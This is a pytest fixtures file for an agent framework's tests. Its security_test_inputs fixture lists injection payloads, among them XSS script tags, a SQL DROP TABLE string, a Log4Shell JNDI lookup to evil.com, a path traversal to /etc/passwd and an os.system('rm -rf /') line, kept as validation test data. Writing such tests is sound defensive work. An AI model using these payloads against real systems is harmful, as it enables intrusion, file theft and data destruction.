"""
Common test fixtures for PromptCraft-Hybrid tests.

This module provides shared fixtures for all test modules, following the
testing guide requirements for reusable setup and teardown logic.
"""

import time
from typing import Any
from unittest.mock import AsyncMock, Mock

import pytest

from src.agents.base_agent import BaseAgent
from src.agents.models import AgentConfig, AgentInput, AgentOutput
from src.agents.registry import AgentRegistry
from src.utils.time_utils import to_utc_datetime


@pytest.fixture
def sample_agent_config() -> dict[str, Any]:
    """Sample agent configuration for testing."""
    return {
        "agent_id": "test_agent",
        "name": "Test Agent",
        "description": "A test agent for unit testing",
        "max_tokens": 1000,
        "temperature": 0.7,
        "timeout": 30.0,
        "enabled": True,
    }


@pytest.fixture
def sample_agent_input() -> AgentInput:
    """Sample AgentInput for testing."""
    return AgentInput(
        content="This is a test input for the agent",
        context={"language": "python", "framework": "fastapi", "operation": "analyze"},
        config_overrides={"max_tokens": 500, "temperature": 0.5},
    )


@pytest.fixture
def sample_agent_output() -> AgentOutput:
    """Sample AgentOutput for testing."""
    return AgentOutput(
        content="This is a test output from the agent",
        metadata={"analysis_type": "security", "issues_found": 0, "confidence_score": 0.95},
        confidence=0.95,
        processing_time=1.234,
        agent_id="test_agent",
        request_id="test-request-123",
    )


@pytest.fixture
def sample_agent_config_model() -> AgentConfig:
    """Sample AgentConfig model for testing."""
    return AgentConfig(
        agent_id="test_agent",
        name="Test Agent",
        description="A test agent for unit testing",
        config={"max_tokens": 1000, "temperature": 0.7, "timeout": 30.0},
        enabled=True,
    )


@pytest.fixture
def mock_base_agent() -> Mock:
    """Mock BaseAgent for testing without implementation."""
    mock_agent = Mock(spec=BaseAgent)
    mock_agent.agent_id = "test_agent"
    mock_agent.config = {"agent_id": "test_agent"}
    mock_agent.logger = Mock()
    mock_agent._initialized = True

    # Mock async methods
    mock_agent.execute = AsyncMock(
        return_value=AgentOutput(
            content="Mocked agent response",
            metadata={"mocked": True},
            confidence=0.9,
            processing_time=0.1,
            agent_id="test_agent",
        ),
    )

    mock_agent.process = AsyncMock(
        return_value=AgentOutput(
            content="Mocked agent response",
            metadata={"mocked": True},
            confidence=0.9,
            processing_time=0.1,
            agent_id="test_agent",
        ),
    )

    return mock_agent


@pytest.fixture
def fresh_agent_registry() -> AgentRegistry:
    """Fresh AgentRegistry instance for testing."""
    registry = AgentRegistry()
    yield registry
    # Cleanup after test
    registry.clear()


@pytest.fixture
def mock_agent_class():
    """Mock agent class for registry testing."""

    class MockAgent(BaseAgent):
        def __init__(self, config: dict[str, Any]):
            super().__init__(config)

        async def execute(self, agent_input: AgentInput) -> AgentOutput:
            return AgentOutput(
                content="Mock response",
                metadata={"mock": True},
                confidence=0.9,
                processing_time=0.1,
                agent_id=self.agent_id,
            )

        def get_capabilities(self) -> dict[str, Any]:
            return {"input_types": ["text"], "output_types": ["text"], "mock_agent": True}

    return MockAgent


@pytest.fixture
def multiple_agent_inputs() -> list[AgentInput]:
    """Multiple AgentInput instances for batch testing."""
    return [
        AgentInput(content="First test input", context={"batch_id": 1}),
        AgentInput(content="Second test input", context={"batch_id": 2}),
        AgentInput(content="Third test input", context={"batch_id": 3}),
    ]


@pytest.fixture
def invalid_agent_configs() -> list[dict[str, Any]]:
    """Invalid agent configurations for testing validation."""
    return [
        {},  # Missing agent_id
        {"agent_id": ""},  # Empty agent_id
        {"agent_id": "test-agent"},  # Invalid format (dash instead of underscore)
        {"agent_id": "test_agent", "name": ""},  # Empty name
        {"agent_id": "test_agent", "name": "Test", "description": ""},  # Empty description
        {"agent_id": "test_agent", "name": "Test", "description": "Test", "enabled": "not_boolean"},  # Invalid boolean
    ]


@pytest.fixture
def mock_logger():
    """Mock logger for testing logging behavior."""
    mock_logger = Mock()
    mock_logger.info = Mock()
    mock_logger.error = Mock()
    mock_logger.warning = Mock()
    mock_logger.debug = Mock()
    return mock_logger


@pytest.fixture
def timestamp_fixture():
    """Fixed timestamp for testing."""
    return to_utc_datetime(2024, 1, 1, 12, 0, 0)


@pytest.fixture
def long_text_content() -> str:
    """Long text content for testing limits."""
    return "This is a test sentence. " * 1000  # 25,000 characters


@pytest.fixture
def edge_case_strings() -> list[str]:
    """Edge case strings for testing validation."""
    return [
        "",  # Empty string
        "   ",  # Whitespace only
        "a",  # Single character
        "a" * 100000,  # Very long string
        "Hello\nWorld",  # With newlines
        "Hello\tWorld",  # With tabs
        "Hello 🌍 World",  # With emojis
        "Hello\x00World",  # With null character
        "Hello\r\nWorld",  # With CRLF
        "Hello\\nWorld",  # With escaped newline
    ]


@pytest.fixture
def sample_metadata() -> dict[str, Any]:
    """Sample metadata for testing."""
    return {
        "analysis_type": "security",
        "rules_checked": 15,
        "issues_found": 2,
        "confidence_score": 0.87,
        "processing_steps": ["validation", "analysis", "reporting"],
        "timestamps": {"start": "2024-01-01T12:00:00Z", "end": "2024-01-01T12:00:05Z"},
    }


@pytest.fixture
def agent_error_contexts() -> list[dict[str, Any]]:
    """Sample error contexts for testing exception handling."""
    return [
        {"error_type": "validation", "field": "content", "value": "", "constraint": "min_length"},
        {"error_type": "execution", "step": "analysis", "timeout": 30.0, "processing_time": 31.5},
        {"error_type": "configuration", "parameter": "max_tokens", "value": -1, "constraint": "positive_integer"},
    ]


# Async fixture for testing async operations
@pytest.fixture
async def async_agent_execution():
    """Async fixture for testing agent execution."""

    async def execute_agent(agent, agent_input):
        return await agent.process(agent_input)

    return execute_agent


# Performance testing fixtures
@pytest.fixture
def performance_test_data():
    """Data for performance testing."""
    return {
        "small_input": "Short test input",
        "medium_input": "Medium test input. " * 100,
        "large_input": "Large test input. " * 10000,
        "expected_processing_times": {"small": 0.1, "medium": 1.0, "large": 10.0},
    }


# Security testing fixtures
@pytest.fixture
def security_test_inputs():
    """Security test inputs for testing injection attacks."""
    return [
        "<script>alert('xss')</script>",
        "'; DROP TABLE users; --",
        "{{7*7}}",
        "${jndi:ldap://evil.com/a}",
        "../../../../etc/passwd",
        "javascript:alert('xss')",
        "data:text/html,<script>alert('xss')</script>",
        "\x00\x01\x02\x03\x04\x05",  # Binary data
        "eval('alert(1)')",
        "import os; os.system('rm -rf /')",
    ]


@pytest.fixture(scope="session")
def test_database_url():
    """Database URL for integration testing."""
    return "sqlite:///:memory:"


@pytest.fixture
def cleanup_after_test():
    """Fixture to ensure cleanup after tests."""
    return
    # Cleanup code here if needed


@pytest.fixture
def performance_metrics():
    """Performance metrics fixture for testing."""

    class PerformanceMetrics:
        def __init__(self):
            self.start_time = 0.0
            self.end_time = 0.0
            self.processing_time = 0.0

        def start(self):
            self.start_time = time.time()

        def stop(self):
            self.end_time = time.time()
            self.processing_time = self.end_time - self.start_time

        def assert_max_duration(self, max_duration):
            assert (
                self.processing_time <= max_duration
            ), f"Processing time {self.processing_time} exceeded maximum {max_duration}"

    return PerformanceMetrics()


@pytest.fixture(
    params=[
        {"invalid": "config"},
        {},
        None,
        [],
        "string_config",
        123,
        {"app_name": ""},
        {"app_name": None},
        pytest.param({"app_name": "a" * 1000}, id="long-app-name"),
        {"app_name": "\x00\x01"},
        {"app_name": "🚀🔥💯"},
        {"environment": "dev"},
        {"valid": "config"},
    ],
)
def config_edge_cases(request):
    """Parametrized fixture for configuration edge cases."""
    return request.param


@pytest.fixture(
    params=[
        None,
        "",
        "a",
        "a" * 100,
        pytest.param("a" * 1000, id="medium-input"),
        pytest.param("a" * 10000, id="large-input"),
        "\x00\x01",
        "🚀🔥💯",
        "\n\r\t",
        "normal input",
        123,
        [],
        {},
    ],
)
def edge_case_inputs(request):
    """Parametrized fixture for edge case inputs."""
    return request.param
